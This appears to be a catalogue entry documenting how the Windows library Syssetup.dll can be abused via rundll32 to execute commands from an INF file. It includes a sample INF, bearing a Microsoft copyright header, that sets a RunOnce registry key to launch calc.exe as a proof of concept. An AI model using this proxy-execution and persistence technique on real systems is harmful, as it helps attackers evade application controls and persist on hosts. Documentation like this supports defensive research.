## Syssetup.dll

* Functions: Execute

```
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 c:\temp\calc.INF
```

Acknowledgements:
* Pierre-Alexandre Braeken - @pabraeken

Code sample:
* 

Resources:
* https://twitter.com/pabraeken/status/994392481927258113

Full path:
```
c:\windows\system32\Syssetup.dll
c:\windows\sysWOW64\Syssetup.dll
```

Notes:
calc.inf
```
; DRIVER.INF
; Copyright (c) Microsoft Corporation.  All rights reserved.
 
[Version]
Signature = "$CHICAGO$"
Class=61883
ClassGuid={7EBEFBC0-3200-11d2-B4C2-00A0C9697D17}
Provider=%Msft%
DriverVer=06/21/2006,6.1.7600.16385
 
[DestinationDirs]
DefaultDestDir = 1
 
[DefaultInstall]
AddReg = CalcStart

[CalcStart]
HKLM,Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce,Install,,cmd.exe /c """calc.exe"""
```



Detection:

 
